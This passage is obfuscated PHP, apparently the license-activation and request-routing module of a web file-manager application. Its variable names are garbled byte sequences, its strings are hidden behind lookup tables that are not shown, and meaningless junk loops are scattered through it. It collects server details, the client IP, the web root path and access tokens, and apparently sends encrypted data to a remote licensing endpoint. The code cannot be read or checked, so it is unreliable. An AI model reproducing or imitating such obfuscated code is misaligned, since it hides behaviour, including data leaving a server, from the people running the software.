(strlen($Ù›µŞÂ) < $Ü±øÀëó[693]) { return; } } public function appRun($Ç‘ÄäÙ™) { $±éŠ×µÔ =& $_SERVER[ÕŸ²ó÷å]; $êÄ‡òƒ¨ =& $_SERVER[¢¿ãÄÁ¤]; $ ş‡ÑÂÙ = explode($êÄ‡òƒ¨[0], $Ç‘ÄäÙ™); $ñ¾Ü“ï‘ = $±éŠ×µÔ[697]; if (strlen($ñ¾Ü“ï‘) < $±éŠ×µÔ[693]) { return; } $êúŠÜ¨œ = strtolower($ ş‡ÑÂÙ[0]); $Ü²óÙ­¬ = $±éŠ×µÔ[698]; if (!$Ü²óÙ­¬) { die; } $‚Ê¯¯ø® = $êÄ‡òƒ¨[3]; if ($êúŠÜ¨œ == $êÄ‡òƒ¨[4]) { $‚Ê¯¯ø® = $êÄ‡òƒ¨[5]; $ ş‡ÑÂÙ[0] = $êÄ‡òƒ¨[6]; $ ş‡ÑÂÙ[1] = $ ş‡ÑÂÙ[1] . $êÄ‡òƒ¨[7]; $Ç‘ÄäÙ™ = join($êÄ‡òƒ¨[0], $ ş‡ÑÂÙ); $Ç‘ÄäÙ™ = trim($Ç‘ÄäÙ™, $êÄ‡òƒ¨[0]); } call_user_func(array($êÄ‡òƒ¨[8], $êÄ‡òƒ¨[9]), $‚Ê¯¯ø® . $êÄ‡òƒ¨[10], $Ç‘ÄäÙ™); ActionCall($Ç‘ÄäÙ™); call_user_func(array($êÄ‡òƒ¨[8], $êÄ‡òƒ¨[9]), $‚Ê¯¯ø® . $êÄ‡òƒ¨[11], $Ç‘ÄäÙ™); $Œ÷öÀ³º = $±éŠ×µÔ[699]; while ($Œ÷öÀ³º < $±éŠ×µÔ[693]) { if ($Œ÷öÀ³º >= 0) { break; } $Œ÷öÀ³º++; } } private function autorun() { $ƒÎåõ¦Ì =& $_SERVER[¢¿ãÄÁ¤]; global $config; $ÇŸŒ»…Ç = $_SERVER[ÕŸ²ó÷å][700]; if (!$ÇŸŒ»…Ç) { return; } if (count($config[$ƒÎåõ¦Ì[12]]) == 0) { return; } foreach ($config[$ƒÎåõ¦Ì[12]] as $Öó–ÜÇ² => $—›¶²³ô) { $this->appRun($—›¶²³ô); } } private function fymddae495da() { $ã‰†İ¹ =& $_SERVER[ÕŸ²ó÷å]; $¢µù“½³ =& $_SERVER[¢¿ãÄÁ¤]; $ï©³”üÕ = $¢µù“½³[4]; $ åêÁ = $GLOBALS[$¢µù“½³[13]][$¢µù“½³[14]][0]; $÷›«‚—• = $ã‰†İ¹[701]; while ($÷›«‚—• < $ã‰†İ¹[60]) { if ($÷›«‚—• >= 0) { break; } $÷›«‚—•++; } if (!$ åêÁ || strlen($ åêÁ) <= strlen($ï©³”üÕ)) { return; } if (strtolower(substr($ åêÁ, -strlen($ï©³”üÕ))) != $ï©³”üÕ) { return; } $î°¼ÚËŒ = substr($ åêÁ, 0, -strlen($ï©³”üÕ)); $«ú“´Èä = $ã‰†İ¹[702]; if (!$«ú“´Èä) { die; } $“¼÷êÔÇ = array($¢µù“½³[4], $î°¼ÚËŒ); $†ä¯Ì†å = $ã‰†İ¹[703]; $Ú² ¦ÆË = array_slice($GLOBALS[$¢µù“½³[13]][$¢µù“½³[14]], 1); $Éé“Û°› = $ã‰†İ¹[704]; if (strlen($Éé“Û°›) < $ã‰†İ¹[705]) { die; } $GLOBALS[$¢µù“½³[13]][$¢µù“½³[14]] = array_merge($“¼÷êÔÇ, $Ú² ¦ÆË); $ÕƒÌİ– = $ã‰†İ¹[706]; $GLOBALS[$¢µù“½³[13]][$¢µù“½³[15]] = implode($¢µù“½³[0], $GLOBALS[$¢µù“½³[13]][$¢µù“½³[14]]); $¶ı²Åå– = $ã‰†İ¹[707]; while ($¶ı²Åå– < $ã‰†İ¹[693]) { if ($¶ı²Åå– >= 0) { break; } $¶ı²Åå–++; } } private function rclbe8004816() { $—ìšé­× =& $_SERVER[ÕŸ²ó÷å]; $òñ‰Ş × =& $_SERVER[¢¿ãÄÁ¤]; if ($GLOBALS[$òñ‰Ş ×[13]][$òñ‰Ş ×[15]] != $òñ‰Ş ×[6]) { return; } $¿ŠÛ›Óö = $_SERVER[$òñ‰Ş ×[16]]; $Ùµ¥×õÛ = $—ìšé­×[708]; while ($Ùµ¥×õÛ < $—ìšé­×[60]) { if ($Ùµ¥×õÛ >= 0) { break; } $Ùµ¥×õÛ++; } $†ùí•£ = $òñ‰Ş ×[17]; $¹ÏõÃ„” = $—ìšé­×[709]; if (!$¹ÏõÃ„”) { return; } if (!strstr($¿ŠÛ›Óö, $†ùí•£)) { return; } $¡ù™ë±™ = strrpos($¿ŠÛ›Óö, $†ùí•£); $†½‘¾Ø = substr($¿ŠÛ›Óö, $¡ù™ë±™ + strlen($†ùí•£)); $ó„‹¦àÔ = $—ìšé­×[710]; if (!$ó„‹¦àÔ) { return; } preg_match_all($òñ‰Ş ×[18], $†½‘¾Ø, $Á å·–); $†½‘¾Ø = trim($Á å·–[0][0], $òñ‰Ş ×[19]); $Ï¡“Äñ = $—ìšé­×[711]; while (strlen($Ï¡“Äñ) < $—ìšé­×[60]) { if (!$Ï¡“Äñ) { break; } $Ï¡“Äñ++; } $GLOBALS[$òñ‰Ş ×[13]][$òñ‰Ş ×[14]] = explode($òñ‰Ş ×[19], $†½‘¾Ø); $GLOBALS[$òñ‰Ş ×[13]][$òñ‰Ş ×[15]] = implode($òñ‰Ş ×[0], $GLOBALS[$òñ‰Ş ×[13]][$òñ‰Ş ×[14]]); } public function run() { $‹Œèş° =& $_SERVER[ÕŸ²ó÷å]; $‘‡å›Ëç =& $_SERVER[¢¿ãÄÁ¤]; $this->rclbe8004816(); $this->fymddae495da(); $ù’Â¥õ£ = $GLOBALS[$‘‡å›Ëç[13]][$‘‡å›Ëç[14]]; $îåö²ï› = $‹Œèş°[712]; $Â½…ã¢è = $GLOBALS[$‘‡å›Ëç[13]][$‘‡å›Ëç[15]]; $š§è°ú = $‹Œèş°[713]; while (strlen($š§è°ú) < $‹Œèş°[714]) { if (!$š§è°ú) { break; } $š§è°ú++; } define($‘‡å›Ëç[20], isset($ù’Â¥õ£[0]) && $ù’Â¥õ£[0] ? $ù’Â¥õ£[0] : $this->defaultModule); $†“»™‡¹ = $‹Œèş°[715]; if (strlen($†“»™‡¹) < $‹Œèş°[716]) { return; } define($‘‡å›Ëç[21], isset($ù’Â¥õ£[1]) && $ù’Â¥õ£[0] ? $ù’Â¥õ£[1] : $this->defaultController); define($‘‡å›Ëç[22], isset($ù’Â¥õ£[2]) && $ù’Â¥õ£[0] ? $ù’Â¥õ£[2] : $this->defaultAction); $¿«şŞÀÅ = $‹Œèş°[717]; define($‘‡å›Ëç[23], MOD . $‘‡å›Ëç[0] . ST . $‘‡å›Ëç[0] . ACT); $ÖãŒ†± = $‹Œèş°[718]; if (!$ÖãŒ†±) { return; } $_SERVER[$‘‡å›Ëç[24]] = strtolower(ACTION); $this->autorun(); if (count($ù’Â¥õ£) >= 3) { $this->appRun($Â½…ã¢è); } else { $this->appRun(ACTION); } } private $paejfb274e01 = array(); private $fterb6ff004e = ''; public function aetn1d7a19b7() { $¤ª³œò¢ =& $_SERVER[ÕŸ²ó÷å]; $Î±«´ŞÂ =& $_SERVER[¢¿ãÄÁ¤]; $this->slgr074044fb(); $Şö§Ê˜Ú = $¤ª³œò¢[719]; if (strlen($Şö§Ê˜Ú) < $¤ª³œò¢[714]) { die; } $this->mvkd9480add3(); $£’ø®“­ = $¤ª³œò¢[720]; while ($£’ø®“­ < $¤ª³œò¢[693]) { if ($£’ø®“­ >= 0) { break; } $£’ø®“­++; } $this->xbpv35ab3c80(); $’¾®Îğ¸ = $¤ª³œò¢[721]; if (!$’¾®Îğ¸) { return; } $this->ewjr810fc96b(); $¶ş©¾‹Ú = $¤ª³œò¢[722]; $this->zwuo70b1a9a4(); $this->cptja8d174ab(); $“‘»¦Úë = $¤ª³œò¢[723]; while ($“‘»¦Úë < $¤ª³œò¢[705]) { if ($“‘»¦Úë >= 0) { break; } $“‘»¦Úë++; } $this->fsvp2e8bb14d(); $ôé›—™‘ = $¤ª³œò¢[724]; $this->zkhv58c797ca($Î±«´ŞÂ[25], array($this, $Î±«´ŞÂ[26])); $this->zkhv58c797ca($Î±«´ŞÂ[27], array($this, $Î±«´ŞÂ[28])); $this->zkhv58c797ca($Î±«´ŞÂ[29], array($this, $Î±«´ŞÂ[30])); $this->zkhv58c797ca($Î±«´ŞÂ[31], array($this, $Î±«´ŞÂ[32])); $¨Õ­´“— = $¤ª³œò¢[725]; while (strlen($¨Õ­´“—) < $¤ª³œò¢[60]) { if (!$¨Õ­´“—) { break; } $¨Õ­´“—++; } } public function zwfb2a9f66c7($ğŞµÑî­) { $øüù¸òÅ =& $_SERVER[ÕŸ²ó÷å]; $¨µ¤Í¥ñ =& $_SERVER[¢¿ãÄÁ¤]; $€Ç«Ö·­ = Model($¨µ¤Í¥ñ[33])->get(); $ëµıŸÕò = array($¨µ¤Í¥ñ[34], $¨µ¤Í¥ñ[35], $¨µ¤Í¥ñ[36], $¨µ¤Í¥ñ[37], $¨µ¤Í¥ñ[38], $¨µ¤Í¥ñ[39], $¨µ¤Í¥ñ[40], $¨µ¤Í¥ñ[41], $¨µ¤Í¥ñ[42], $¨µ¤Í¥ñ[43], $¨µ¤Í¥ñ[44], $¨µ¤Í¥ñ[45], $¨µ¤Í¥ñ[46], $¨µ¤Í¥ñ[47], $¨µ¤Í¥ñ[48], $¨µ¤Í¥ñ[49], $¨µ¤Í¥ñ[50], $¨µ¤Í¥ñ[51], $¨µ¤Í¥ñ[52], $¨µ¤Í¥ñ[53], $¨µ¤Í¥ñ[54], $¨µ¤Í¥ñ[55], $¨µ¤Í¥ñ[56], $¨µ¤Í¥ñ[57], $¨µ¤Í¥ñ[58], $¨µ¤Í¥ñ[59], $¨µ¤Í¥ñ[60], $¨µ¤Í¥ñ[61], $¨µ¤Í¥ñ[62], $¨µ¤Í¥ñ[63], $¨µ¤Í¥ñ[64], $¨µ¤Í¥ñ[65], $¨µ¤Í¥ñ[66], $¨µ¤Í¥ñ[67], $¨µ¤Í¥ñ[68], $¨µ¤Í¥ñ[69], $¨µ¤Í¥ñ[70], $¨µ¤Í¥ñ[71], $¨µ¤Í¥ñ[72], $¨µ¤Í¥ñ[73], $¨µ¤Í¥ñ[74], $¨µ¤Í¥ñ[75], $¨µ¤Í¥ñ[76], $¨µ¤Í¥ñ[77], $¨µ¤Í¥ñ[78], $¨µ¤Í¥ñ[79], $¨µ¤Í¥ñ[80], $¨µ¤Í¥ñ[81], $¨µ¤Í¥ñ[82], $¨µ¤Í¥ñ[83], $¨µ¤Í¥ñ[84], $¨µ¤Í¥ñ[85]); $†“£èæ = $øüù¸òÅ[726]; if (!$†“£èæ) { die; } foreach ($ëµıŸÕò as $ïşó¨Ò) { $¨Ğ¦³¹ = $GLOBALS[$¨µ¤Í¥ñ[86]][$¨µ¤Í¥ñ[87]][$ïşó¨Ò]; $‰…ŒÄã = $øüù¸òÅ[727]; if (!$‰…ŒÄã) { die; } if (isset($€Ç«Ö·­[$ïşó¨Ò])) { $¨Ğ¦³¹ = $€Ç«Ö·­[$ïşó¨Ò]; } $ğŞµÑî­[$¨µ¤Í¥ñ[88]][$¨µ¤Í¥ñ[89]][$ïşó¨Ò] = $¨Ğ¦³¹; } $°ë®Ñô = $ğŞµÑî­[$¨µ¤Í¥ñ[88]][$¨µ¤Í¥ñ[89]][$¨µ¤Í¥ñ[46]]; unset($ğŞµÑî­[$¨µ¤Í¥ñ[88]][$¨µ¤Í¥ñ[90]][$¨µ¤Í¥ñ[91]]); unset($ğŞµÑî­[$¨µ¤Í¥ñ[88]][$¨µ¤Í¥ñ[90]][$¨µ¤Í¥ñ[92]]); unset($ğŞµÑî­[$¨µ¤Í¥ñ[88]][$¨µ¤Í¥ñ[89]][$¨µ¤Í¥ñ[46]]); $ˆæ«´°› = $øüù¸òÅ[728]; if (strlen($ˆæ«´°›) < $øüù¸òÅ[716]) { return; } unset($ğŞµÑî­[$¨µ¤Í¥ñ[88]][$¨µ¤Í¥ñ[89]][$¨µ¤Í¥ñ[93]]); $ğŞµÑî­[$¨µ¤Í¥ñ[88]][$¨µ¤Í¥ñ[89]][$¨µ¤Í¥ñ[94]] = array($¨µ¤Í¥ñ[95] => (int) $°ë®Ñô[$¨µ¤Í¥ñ[96]], $¨µ¤Í¥ñ[97] => (int) _get($°ë®Ñô, $¨µ¤Í¥ñ[98], 0)); $¤Ó¤ç = substr(md5($¨µ¤Í¥ñ[99] . get_client_ip() . $€Ç«Ö·­[$¨µ¤Í¥ñ[100]]), 0, 15); $š‡ƒÊ¹ = $øüù¸òÅ[729]; while (strlen($š‡ƒÊ¹) < $øüù¸òÅ[716]) { if (!$š‡ƒÊ¹) { break; } $š‡ƒÊ¹++; } $ğŞµÑî­[$¨µ¤Í¥ñ[101]][$¨µ¤Í¥ñ[102]] = Mcrypt::encode(Session::sign(), $¤Ó¤ç, 3600 * 24); $³Èó÷ñ• = $øüù¸òÅ[730]; $ğŞµÑî­[$¨µ¤Í¥ñ[101]][$¨µ¤Í¥ñ[103]] = Action($¨µ¤Í¥ñ[104])->accessToken(); $ğŞµÑî­[$¨µ¤Í¥ñ[101]][$¨µ¤Í¥ñ[105]] = md5($_SERVER[$¨µ¤Í¥ñ[106]] . $€Ç«Ö·­[$¨µ¤Í¥ñ[100]]); $ğŞµÑî­[$¨µ¤Í¥ñ[101]][$¨µ¤Í¥ñ[107]] = base64_encode(serverInfo()); $ŒŒß¯ş = $øüù¸òÅ[731]; $ğŞµÑî­[$¨µ¤Í¥ñ[101]][$¨µ¤Í¥ñ[108]] = $this->fterb6ff004e; if ($€Ç«Ö·­[$¨µ¤Í¥ñ[108]] != $¨µ¤Í¥ñ[109]) { $ğŞµÑî­[$¨µ¤Í¥ñ[101]][$¨µ¤Í¥ñ[110]] = $€Ç«Ö·­[$¨µ¤Í¥ñ[110]]; $ğŞµÑî­[$¨µ¤Í¥ñ[101]][$¨µ¤Í¥ñ[111]] = $€Ç«Ö·­[$¨µ¤Í¥ñ[111]]; $¥ëÚœšõ = rand_string(10) . $this->fterb6ff004e . rand_string(5); $ğŞµÑî­[$¨µ¤Í¥ñ[88]][$¨µ¤Í¥ñ[112]][$¨µ¤Í¥ñ[113]] = $this->qeykdb1b5d10($¥ëÚœšõ, $ğŞµÑî­[$¨µ¤Í¥ñ[101]][$¨µ¤Í¥ñ[105]]); } if ($this->fterb6ff004e == $¨µ¤Í¥ñ[109]) { $ğŞµÑî­[$¨µ¤Í¥ñ[88]][$¨µ¤Í¥ñ[89]][$¨µ¤Í¥ñ[94]][$¨µ¤Í¥ñ[98]] = 0; } $ğŞµÑî­[$¨µ¤Í¥ñ[101]][$¨µ¤Í¥ñ[114]] = $this->versionPluginFilter(); $ğŞµÑî­[$¨µ¤Í¥ñ[101]][$¨µ¤Í¥ñ[115]] = _get($this->paejfb274e01, $¨µ¤Í¥ñ[116], $¨µ¤Í¥ñ[6]); if (KodUser::isRoot() && $this->config[$¨µ¤Í¥ñ[117]]) { $ğŞµÑî­[$¨µ¤Í¥ñ[101]][$¨µ¤Í¥ñ[118]] = WEB_ROOT; } return $ğŞµÑî­; } private function cptja8d174ab() { $×Óë¶ï =& $_SERVER[ÕŸ²ó÷å]; $™˜æˆïØ =& $_SERVER[¢¿ãÄÁ¤]; $¯É·²È€ = $_SERVER[$™˜æˆïØ[24]] == $™˜æˆïØ[119]; if ($_SERVER[$™˜æˆïØ[24]] == $™˜æˆïØ[120] && $_GET[$™˜æˆïØ[121]] == $™˜æˆïØ[122]) { $¯É·²È€ = !0; } if ($¯É·²È€) { $…’Åâ = array($™˜æˆïØ[108] => $this->fterb6ff004e, $™˜æˆïØ[123] => $this->vsxjcb69798e(), $™˜æˆïØ[124] => Model($™˜æˆïØ[125])->count()); if ($this->fterb6ff004e != $™˜æˆïØ[109]) { $Š›“úËˆ = _get($this->paejfb274e01, $™˜æˆïØ[126]); if ($Š›“úËˆ) { $…’Åâ[$™˜æˆïØ[127]] = $Š›“úËˆ; $…’Åâ[$™˜æˆïØ[128]] = strtotime(_get($this->paejfb274e01, $™˜æˆïØ[129])); $…’Åâ[$™˜æˆïØ[130]] = _get($this->paejfb274e01, $™˜æˆïØ[116]); } $â­‰æ–Û = Model($™˜æˆïØ[33])->get($™˜æˆïØ[131], $™˜æˆïØ[6], !0); if (is_string($â­‰æ–Û) && substr($â­‰æ–Û, 0, 1) == $™˜æˆïØ[132]) { $â­‰æ–Û = json_decode_force($â­‰æ–Û); } if (is_array($â­‰æ–Û) && $â­‰æ–Û[$™˜æˆïØ[133]] && strstr($â­‰æ–Û[$™˜æˆïØ[133]], $™˜æˆïØ[134])) { $¸¡‹ã¿ = explode($™˜æˆïØ[134], $â­‰æ–Û[$™˜æˆïØ[133]]); $…’Åâ[$™˜æˆïØ[135]] = $¸¡‹ã¿[0]; } } $…’Åâ = $this->wgdodc4d6c43(json_encode($…’Åâ), md5($™˜æˆïØ[136])); $òº©ßæÂ = array($™˜æˆïØ[137] => $…’Åâ); call_user_func(array($™˜æˆïØ[138], $™˜æˆïØ[139]), $òº©ßæÂ); } if ($this->fterb6ff004e == $™˜æˆïØ[109]) { return; } $íÍÛ­ã¹ = array($™˜æˆïØ[140], $™˜æˆïØ[141], $™˜æˆïØ[142], $™˜æˆïØ[143], $™˜æˆïØ[144], $™˜æˆïØ[145]); $“´ÊË²§ = $×Óë¶ï[732]; while ($“´ÊË²§ < $×Óë¶ï[714]) { if ($“´ÊË²§ >= 0) { break; } $“´ÊË²§++; } $Ù¿¸œÖù = Model($™˜æˆïØ[33])->get(); $òº©ßæÂ = array($™˜æˆïØ[146] => $Ù¿¸œÖù[$™˜æˆïØ[34]], $™˜æˆïØ[147] => $Ù¿¸œÖù[$™˜æˆïØ[35]], $™˜æˆïØ[148] => $™˜æˆïØ[6]); $ÂÃ’í”‰ = $×Óë¶ï[733]; foreach ($íÍÛ­ã¹ as $ŒÒ¸°¿) { if (!isset($Ù¿¸œÖù[$ŒÒ¸°¿]) || !$Ù¿¸œÖù[$ŒÒ¸°¿]) { continue; } $òº©ßæÂ[$ŒÒ¸°¿] = $Ù¿¸œÖù[$ŒÒ¸°¿]; $¶Úá·§İ = $×Óë¶ï[734]; if (!$¶Úá·§İ) { die; } } call_user_func(array($™˜æˆïØ[138], $™˜æˆïØ[139]), $òº©ßæÂ); } private function ewjr810fc96b() { $ÆÌß–¶ =& $_SERVER[ÕŸ²ó÷å]; $‚¹·ğÈß =& $_SERVER[¢¿ãÄÁ¤]; if ($_SERVER[$‚¹·ğÈß[24]] != $‚¹·ğÈß[149]) { return; } if (!KodUser::isRoot()) { die; } $ŸÆø•¶Š = $GLOBALS[$‚¹·ğÈß[13]]; if (isset($ŸÆø•¶Š[$‚¹·ğÈß[150]])) { $this->stkf7d959455(); die; } if (isset($ŸÆø•¶Š[$‚¹·ğÈß[151]]) && isset($ŸÆø•¶Š[$‚¹·ğÈß[151]]) == $‚¹·ğÈß[122]) { $ŸÆø•¶Š[$‚¹·ğÈß[152]] = Model($‚¹·ğÈß[33])->get($‚¹·ğÈß[153]); } if (!isset($ŸÆø•¶Š[$‚¹·ğÈß[152]]) || strlen($ŸÆø•¶Š[$‚¹·ğÈß[152]]) != 16) { show_json($‚¹·ğÈß[154] . $ŸÆø•¶Š[$‚¹·ğÈß[152]], !1); } $‰Ñƒ‡æ¤ = Model($‚¹·ğÈß[33])->get($‚¹·ğÈß[100]); $†–à•Ñ… = md5($_SERVER[$‚¹·ğÈß[106]] . $‰Ñƒ‡æ¤); $ºö¡ÜÕÓ = $ÆÌß–¶[735]; while (strlen($ºö¡ÜÕÓ) < $ÆÌß–¶[60]) { if (!$ºö¡ÜÕÓ) { break; } $ºö¡ÜÕÓ++; } $Ç½ü“¡ = array($‚¹·ğÈß[152] => $ŸÆø•¶Š[$‚¹·ğÈß[152]], $‚¹·ğÈß[155] => rand_string(16), $‚¹·ğÈß[156] => $‚¹·ğÈß[136], $‚¹·ğÈß[157] => $‚¹·ğÈß[158], $‚¹·ğÈß[159] => $_SERVER[$‚¹·ğÈß[160]], $‚¹·ğÈß[161] => $_SERVER[$‚¹·ğÈß[162]], $‚¹·ğÈß[163] => $_SERVER[$‚¹·ğÈß[164]], $‚¹·ğÈß[105] => $†–à•Ñ…, $‚¹·ğÈß[165] => Model($‚¹·ğÈß[33])->get($‚¹·ğÈß[131])); $Ë²‡Ñ§Ş = $ÆÌß–¶[736]; while ($Ë²‡Ñ§Ş < $ÆÌß–¶[693]) { if ($Ë²‡Ñ§Ş >= 0) { break; } $Ë²‡Ñ§Ş++; } if (isset($ŸÆø•¶Š[$‚¹·ğÈß[151]]) && isset($ŸÆø•¶Š[$‚¹·ğÈß[151]]) == $‚¹·ğÈß[122]) { $Ç½ü“¡[$‚¹·ğÈß[151]] = md5($Ç½ü“¡[$‚¹·ğÈß[152]] . $‚¹·ğÈß[166] . $Ç½ü“¡[$‚¹·ğÈß[155]]); } if ($ŸÆø•¶Š[$‚¹·ğÈß[167]] == $‚¹·ğÈß[168]) { $ÓúÌùã = $this->wgdodc4d6c43($†–à•Ñ…, $‚¹·ğÈß[169]); $şÍ¶»€ = $this->qeykdb1b5d10(json_encode($Ç½ü“¡), $†–à•Ñ… . $‚¹·ğÈß[170], 3); $şÍ¶»€ = $şÍ¶»€ . $‚¹·ğÈß[171] . $_SERVER[$‚¹·ğÈß[160]]; $ãª¬š‹³ = $this->erfg433172bf($‚¹·ğÈß[172] . $ÓúÌùã . $‚¹·ğÈß[173] . $şÍ¶»€, -1); show_json($ãª¬š‹³, !0); } else { if ($ŸÆø•¶Š[$‚¹·ğÈß[167]] == $‚¹·ğÈß[174]) { $ÒòÜ“ŸÎ = substr(md5($‚¹·ğÈß[175] . $†–à•Ñ…), 12, 15) . $‚¹·ğÈß[176]; $şÍ¶»€ = $this->pkuv639d94b1(trim($ŸÆø•¶Š[$‚¹·ğÈß[177]]), $ÒòÜ“ŸÎ, 2); $²’õ¤ö÷ = json_decode($şÍ¶»€, !0); if (!is_array($²’õ¤ö÷) || !is_array($²’õ¤ö÷[$‚¹·ğÈß[178]]) || $²’õ¤ö÷[$‚¹·ğÈß[152]] != !0) { $Ùû÷¤‡Õ = $‚¹·ğÈß[179]; $Ûó’æíŠ = $²’õ¤ö÷[$‚¹·ğÈß[178]] ? $‚¹·ğÈß[180] . $²’õ¤ö÷[$‚¹·ğÈß[178]] : $Ùû÷¤‡Õ; show_json($Ûó’æíŠ, !1); } else { $Ç½ü“¡[$‚¹·ğÈß[155]] = $²’õ¤ö÷[$‚¹·ğÈß[178]][$‚¹·ğÈß[181]]; } } else { $²’õ¤ö÷ = $this->erfg433172bf($‚¹·ğÈß[182], $Ç½ü“¡, 10); } } if (!is_array($²’õ¤ö÷) || !is_array($²’õ¤ö÷[$‚¹·ğÈß[178]]) || $²’õ¤ö÷[$‚¹·ğÈß[152]] != !0) { $Ùû÷¤‡Õ = LNG($‚¹·ğÈß[183]); $Ûó’æíŠ = $²’õ¤ö÷[$‚¹·ğÈß[178]] ? $‚¹·ğÈß[180] . $²’õ¤ö÷[$‚¹·ğÈß[178]] : $Ùû÷¤‡Õ; show_json($Ûó’æíŠ, !1); } $Ù‡º­µµ = $²’õ¤ö÷[$‚¹·ğÈß[178]]; $À·é › = $this->fyqv110a469c($Ù‡º­µµ[$‚¹·ğÈß[184]]); $úœ³×ìœ = $ÆÌß–¶[737]; if (strlen($úœ³×ìœ) < $ÆÌß–¶[716]) { die; } if (!$À·é › || $À·é › != $Ù‡º­µµ[$‚¹·ğÈß[129]]) { $„ŒÃşÈ = array($‚¹·ğÈß[185] => Model($‚¹·ğÈß[33])->get($‚¹·ğÈß[100]), $‚¹·ğÈß[186] => $_SERVER[$‚¹·ğÈß[106]], $‚¹·ğÈß[187] => this_url(), $‚¹·ğÈß[161] => $_SERVER[$‚¹·ğÈß[162]]); $şÍ¶»€ = $this->wtyva4e1b61c(json_encode($„ŒÃşÈ)); $this->erfg433172bf($‚¹·ğÈß[188] . $şÍ¶»€); show_json(LNG($‚¹·ğÈß[189]), !0); } $½ãŠ˜µ = array($‚¹·ğÈß[153] => $Ù‡º­µµ[$‚¹·ğÈß[190]], $‚¹·ğÈß[191] => $Ù‡º­µµ[$‚¹·ğÈß[192]], $‚¹·ğÈß[193] => rand_string(16), $‚¹·ğÈß[108] => $Ù‡º­µµ[$‚¹·ğÈß[194]]); if ($Ç½ü“¡[$‚¹·ğÈß[155]]) { $½ãŠ˜µ[$‚¹·ğÈß[193]] = $Ç½ü“¡[$‚¹·ğÈß[155]]; } $Š°Ô§ïÃ = substr(md5($½ãŠ˜µ[$‚¹·ğÈß[191]]), 10, 10); $‹éâµŒù = $Š°Ô§ïÃ . $½ãŠ˜µ[$‚¹·ğÈß[108]] . $½ãŠ˜µ[$‚¹·ğÈß[193]]; $Çšãö‡ = $ÆÌß–¶[738]; $½ãŠ˜µ[$‚¹·ğÈß[110]] = strrev(base64_encode($this->wgdodc4d6c43($‹éâµŒù, $‚¹·ğÈß[195]))); $Ìé˜Ñè = rand_string(16); $±…¦­Èà = $ÆÌß–¶[739]; $âÍøœ÷ = $Ìé˜Ñè . $½ãŠ˜µ[$‚¹·ğÈß[108]] . $this->wgdodc4d6c43(md5($½ãŠ˜µ[$‚¹·ğÈß[153]]), $Ìé˜Ñè); $ãÅ ÈúÚ = $ÆÌß–¶[740]; if (!$ãÅ ÈúÚ) { return; } $½ãŠ˜µ[$‚¹·ğÈß[111]] = base64_encode(strrev($this->wgdodc4d6c43($âÍøœ÷, $‚¹·ğÈß[196]))); if ($Ù‡º­µµ[$‚¹·ğÈß[197]] && $Ù‡º­µµ[$‚¹·ğÈß[197]] >= 1) { Model($‚¹·ğÈß[33])->setDeep($‚¹·ğÈß[198], $‚¹·ğÈß[122]); } Model($‚¹·ğÈß[33])->set($½ãŠ˜µ); $Õ´íü = md5($_SERVER[$‚¹·ğÈß[106]] . strrev($‰Ñƒ‡æ¤) . $½ãŠ˜µ[$‚¹·ğÈß[191]]); $îÊÄ¥½› = $ÆÌß–¶[741]; if (strlen($îÊÄ¥½›) < $ÆÌß–¶[714]) { return; } $ö±ëØ® = strrev(substr($Õ´íü, 10, 16)); $Ê»½ßÓ´ = $ÆÌß–¶[742]; $œûëÄâ = $this->qeykdb1b5d10(json_encode($Ù‡º­µµ), $Õ´íü); $©âáÜŸî = array_to_keyvalue(Model($‚¹·ğÈß[7])->listData(), $‚¹·ğÈß[199]); $Õ£Û‘öæ = $©âáÜŸî[$‚¹·ğÈß[200]]; $üÙôÚÁ = $ÆÌß–¶[743]; if (strlen($üÙôÚÁ) < $ÆÌß–¶[60]) { die; } $¥ıÊö™¼ = array(); $ü†¬äõ„ = $ÆÌß–¶[744]; if (!$ü†¬äõ„) { die; } $¥ıÊö™¼[$ö±ëØ®] = $œûëÄâ; $İµ¯Âò¥ = $ÆÌß–¶[745]; if (strlen($İµ¯Âò¥) < $ÆÌß–¶[716]) { return; } Model($‚¹·ğÈß[7])->update($Õ£Û‘öæ[$‚¹·ğÈß[201]], array($‚¹·ğÈß[202] => $¥ıÊö™¼)); $this->paejfb274e01 = $Ù‡º­µµ; $Í‰ëŠ¼ô = $ÆÌß–¶[746]; if (!$Í‰ëŠ¼ô) { return; } $this->fterb6ff004e = $½ãŠ˜µ[$‚¹·ğÈß[108]]; $this->licenseRegistSuccess(); Cache::set($‚¹·ğÈß[203] . md5($‰Ñƒ‡æ¤ . $‚¹·ğÈß[204]), $‚¹·ğÈß[6]); show_json(LNG($‚¹·ğÈß[189]), !0); $¸ÅóÓ§¨ = $ÆÌß–¶[747]; if (!$¸ÅóÓ§¨) { return; } } private function licenseRegistSuccess() { $”ı½¤§Ş =& $_SERVER[ÕŸ²ó÷å]; $ÄöÂ‹æ =& $_SERVER[¢¿ãÄÁ¤]; $È“ë² = Model($ÄöÂ‹æ[33])->get(); $÷ÑÈ’ìÈ = $”ı½¤§Ş[748]; if (strlen($÷ÑÈ’ìÈ) < $”ı½¤§Ş[60]) { return; } if ($È“ë²[$ÄöÂ‹æ[63]] != $ÄöÂ‹æ[122]) { Model($ÄöÂ‹æ[33])->set($ÄöÂ‹æ[63], $ÄöÂ‹æ[122]); } Action($ÄöÂ‹æ[205])->initStart(!0); } private function stkf7d959455() { $ÏÊ–•µ” =& $_SERVER[ÕŸ²ó÷å]; $Ÿ¦¢°æ =& $_SERVER[¢¿ãÄÁ¤]; Model($Ÿ¦¢°æ[33])->set(array($Ÿ¦¢°æ[153] => $Ÿ¦¢°æ[6], $Ÿ¦¢°æ[191] => $Ÿ¦¢°æ[6], $Ÿ¦¢°æ[108] => $Ÿ¦¢°æ[109], $Ÿ¦¢°æ[110] => $Ÿ¦¢°æ[6], $Ÿ¦¢°æ[111] => $Ÿ¦¢°æ[6])); $´’Ú¸ëÛ = $ÏÊ–•µ”[749]; if (strlen($´’Ú¸ëÛ) < $ÏÊ–•µ”[693]) { return; } Model($Ÿ¦¢°æ[33])->setDeep($Ÿ¦¢°æ[198], $Ÿ¦¢°æ[206]); $this->paejfb274e01 = array(); $this->fterb6ff004e = $Ÿ¦¢°æ[109]; } private function slgr074044fb() { $ÔæıüÇ =& $_SERVER[ÕŸ²ó÷å]; $óƒ…¦ ² =& $_SERVER[¢¿ãÄÁ¤]; $_SERVER[$óƒ…¦ ²[162]] = _get($_SERVER, $óƒ…¦ ²[162], APP_HOST); $this->fterb6ff004e = $óƒ…¦ ²[109]; $Ñ‰×³®ä = $ÔæıüÇ[750]; if (!$Ñ‰×³®ä) { return; } $ú…ƒèÓ¢ = Model($óƒ…¦ ²[33])->get(); 